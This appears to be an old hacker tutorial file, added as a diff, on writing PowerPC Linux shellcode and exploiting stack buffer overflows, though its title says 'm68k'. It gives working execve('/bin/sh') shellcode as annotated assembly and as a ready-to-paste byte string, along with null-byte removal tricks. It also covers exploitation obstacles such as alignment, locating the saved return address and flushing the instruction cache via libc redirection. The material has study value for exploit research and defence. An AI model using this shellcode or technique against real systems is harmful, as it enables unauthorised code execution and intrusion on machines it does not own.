@@ -1,0 +1,157 @@
+    m68k buffer overflows 
+                    -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+                                by lamagra <lamagra@uglypig.org>
+
+---[ Introduction
+
+I looked into linuxppc overflows because:
+        1) Nobody had ever done it (that i know of)
+        2) The crack.linuxppc.org game (i like wargames)
+
+Before i could get started with my research i needed a box to work on,
+lockdown (aka bladerhater) gave me access to his linuxppc (Thanks and greets to him).
+Next i needed some background and architecture information, i found a huge 
+architecture guide with a full instruction set included.
+
+Finally i got started with making shellcode.
+
+--[ shellcode
+
+For the shellcode i used the same technique as the x86 shellcode:
+        jmp - call - pop address - start shell
+
+I had to change this a little because a powerpc doesn't like the stack that much.
+(Would be dumb too, with more than 30 registers). So i started coding my asm program.
+After 10 min i got myself this working code:
+
+<main>:
+7c 00 00 50     subf    r0,r0,r0                # r0 = r0 - r0
+48 00 00 21     bl      1800404 <main+0x24>     # call <main + 0x24>
+7c 88 02 a6     mflr    r4                      # load address
+90 9f 00 08     stw     r4,8(r31)               # store word r4
+90 1f 00 0c     stw     r0,12(r31)              # store word r0 (== null)
+80 7f 00 08     lwz     r3,8(r31)               # load address of 8(r31) into r3
+38 9f 00 08     addi    r4,r31,8                # r4 = r31 + 8
+38 00 00 0b     li      r0,11                   # r0 = 11
+44 00 00 02     sc                              # systemcall
+4b ff ff e5     bl      18003e8 <main+0x8>      # call <main + 0x8>
+2f 62 69 6e     cmpdi   cr6,r2,26990            # /bin
+2f 73 68 00     cmpdi   cr6,r19,26624           # /sh
+
+But as you can see it has a lot of null's in it, i really didn't like the null's
+in the systemcall instruction. After a tip (thanx nuuB), i knew that those null's
+were reserved bits. They could be changed into something else without trouble.
+
+Changes:
+from    ->              to
+subf r0,r0,r0           xor r30,r30
+stw r4,8(r31)           stw r4,264(r31)
+stw r0,12(r31)          stw r30,268(r31)
+lwx r4,8(r31)           lwz r4,264(r31)
+addi r4,r31,8           addi r4,r31,264
+sc                      .long 0x44010102
+
+This leaves the first "bl" and the "li" instruction.
+
+li:
+        You could write -(the number) into the register and then negate it.
+        So, lis r30,-1
+            ori r30,r30,65525 (65525 = 65536 - 11)
+            nego r0,r30
+
+bl:
+        There are mutiple ways for getting around this, but size does matter (in this situation :-)
+        You could easily add some nops in between to make the jump-address bigger
+        and getting rid of those null's. But that would be taking the easy way out :).
+        After a conversation about my teensy portbinding shellcode, i realized i could use
+        <saved framepointer> to give my code its own location (when overwritten with the 
+        same value). Add the code's size to the framepointer (r31) and you have the 
+        address of  "/bin/sh".
+
+newbie note:
+stack at overflow time:
+        <saved instruction pointer>
+        <saved framepointer>
+        [buffer]
+          ...
+end note
+
+
+All put together gives:
+
+   c:   38 9f 01 2d     addi    r4,r31,301
+  10:   38 84 fe ff     addi    r4,r4,-257
+  14:   7f de f2 78     xor     r30,r30,r30
+  18:   90 81 01 08     stw     r4,264(r1)
+  1c:   93 c1 01 0c     stw     r30,268(r1)
+  20:   80 61 01 08     lwz     r3,264(r1)
+  24:   38 81 01 08     addi    r4,r1,264
+  28:   3f c0 ff ff     lis     r30,-1
+  2c:   63 de ff f5     ori     r30,r30,65525
+  30:   7c 1e 04 d0     nego    r0,r30
+  34:   44 01 01 02     .long 0x44010102
+  38:   2f 62 69 6e     cmpdi   cr6,r2,26990
+  3c:   2f 73 68 00     cmpdi   cr6,r19,26624
+*/
+
+#define CODESIZE 51
+char ppc_code[] = 
+"\x38\x9f\x01\x2d\x38\x84\xfe\xff\x7f\xde\xf2\x78\x90\x81\x01\x08\x93\xc1\x01"
+"\x0c\x80\x61\x01\x08\x38\x81\x01\x08\x3f\xc0\xff\xff\x63\xde\xff\xf5\x7c\x1e"
+"\x04\xd0\x44\x01\x01\x02/bin/sh";
+
+Problems: we use the framepointer so the overflow has to be exact.
+          We can't use nops or we would have to know the exact length of them
+          (This would probably be the case since every instruction is 4 bytes, 
+          alignment is *really* important).
+
+At the end of this file, you'll find an other shellcode (coded by nuuB) which
+doesn't use the framepointer but is double in size.
+
+---[ Overflow problems
+
+Buffer overflows are exploited the same way as on x86,etc. but:
+*note: every problem will be discussed in detail below.
+
+        * alignment is more important
+        * functions have to be used inside the vunerable function
+        * the location of the <saved instructionpointer>
+        * "dirty" instruction cache has to be cleaned
+
+-----[ alignment
+
+Every instruction is a multiple of 4 bytes. When we return of a faulty address
+the code will most likely cause a SIGILL.
+
+*note:
+ nop = "\x60\x00\x00\x00". 
+The null's are reserved as well, one could change them into 0x60 (easy to put in).
+*end note
+
+------[ functions
+
+The return address of a function is saved in the link register (lr), when a new function
+is called it is saved on the stack for later use. If not, the link register is
+used to return (no overwriting possible). The case of this happening is really
+small tho.
+
+------[ Where is the damned <saved ip>???
+
+I've noticed that in some situations the distance between <saved ip> and the top 
+buffer varies. I found a distance of 80 ones, other 40,8.
+I haven't looked into this because i doesn't really matter.
+
+------[ Instruction cache
+
+The biggest problem of them all would be the "dirty" i-cache.
+The shellcode can't be executed unless the i-cache is cleaned first.
+There isn't any cleaning code inside the program we can call/use.
+
+Solutions:
+        After a user/kernel/user call the cache is clean.
+        1) You could insert the shellcode before the overflow, after a syscall
+           the cache would be clean. And it can be executed.
+        2) Redirect the execution through libc (syscall wrapper)
+           This can be done by using framepointer and intruction pointer at the 
+           same time: instruction pointer = address of wrapper
+                      framepointer points to a location with the shellcode address
